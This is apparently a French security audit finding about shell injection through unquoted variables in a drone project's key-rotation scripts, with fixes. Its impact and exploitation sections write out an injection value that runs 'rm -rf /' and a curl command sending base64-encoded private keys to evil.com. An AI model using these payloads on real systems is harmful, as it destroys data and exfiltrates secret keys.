# Faille 21 — `rotate_all_keys.sh` : injection shell via variables non quotées

## Priorité : **P1 — Haute** · Gravité : ~6.2

## Localisation
- `server_source/tools/rotate_all_keys.sh`
- `drone_transition_source/scripts/rotate_drone_identity.sh`
- `drone_transition_source/scripts/provision_optee_session_auth.sh`
- `drone_transition_source/scripts/sync_to_jetson.sh`

## Description
Plusieurs scripts shell du projet concatènent des variables d'environnement ou des arguments CLI sans quoting strict. Exemples typiques observés :
```bash
# rotate_all_keys.sh
TARGET_DIR=${1:-/var/lib/hesia/keys}
DRONE_ID=${DRONE_ID:-$(hostname)}
openssl genpkey -algorithm ed25519 -out $TARGET_DIR/drone_${DRONE_ID}.key
scp $TARGET_DIR/*.pub user@$REMOTE_HOST:$REMOTE_PATH
```

**Problèmes** :
1. **Variables non quotées** (`$TARGET_DIR`, `$DRONE_ID`, `$REMOTE_HOST`, `$REMOTE_PATH`) → injection shell si l'opérateur passe une valeur contenant espaces, backticks, `$(...)`.
2. **`set -e` / `set -u` / `set -o pipefail` manquants** sur certains scripts → erreurs silencieuses.
3. **Pas de `--` séparateur** pour `openssl`, `scp`, `cp` → option injection.
4. **Chemins absolus non vérifiés** : `cp /etc/hesia/keys/*.key $TARGET_DIR` peut diffuser partout.
5. **Permissions post-création** non systématiquement posées : `chmod 600` absent après certains `openssl genpkey`.

## Impact
- **RCE local** si attaquant contrôle une variable (via env, via CI pipeline, via tool UI) :
  ```bash
  DRONE_ID='; rm -rf /; #' ./rotate_all_keys.sh
  ```
- **Exfiltration de clés** via redirection : `REMOTE_HOST="attacker.com"` si non validé.
- **Permissions trop larges** : clés privées en `0644`.

## Scénario d'exploitation
1. Attaquant obtient accès à un runner CI (ex: GitLab runner compromis).
2. Déclenche le job rotate avec `DRONE_ID='foo && curl evil.com/$(cat /etc/hesia/keys/*.key | base64)'`.
3. Les clés sont exfiltrées.

## Correctif recommandé
1. **Quoter systématiquement** toutes les variables : `"$TARGET_DIR"`, `"$DRONE_ID"`, `"$REMOTE_HOST"`.
2. **Valider format** :
   ```bash
   [[ "$DRONE_ID" =~ ^[a-zA-Z0-9_-]{3,32}$ ]] || { echo "invalid DRONE_ID" >&2; exit 2; }
   ```
3. **`set -euo pipefail`** en tête de chaque script.
4. **Séparateur `--`** pour toutes les commandes CLI.
5. **Réécrire en Python ou Go** les scripts critiques (rotation, provisioning) pour éliminer l'injection shell.
6. **Permissions strictes** : `umask 077` + `install -m 0600` post-création.
7. **ShellCheck CI** : `shellcheck --severity=warning tools/*.sh` en pre-commit.

## Dépendances
- Faille_18 : allowlist manipulable si scripts exécutés avec injection.
- Faille_25 : clé SSH privée, quoting fail peut exposer.

## Jetson requis
Non.

## Effort estimé
- 3 à 5 jours dev + CI ShellCheck + 2 jours tests de non-régression.
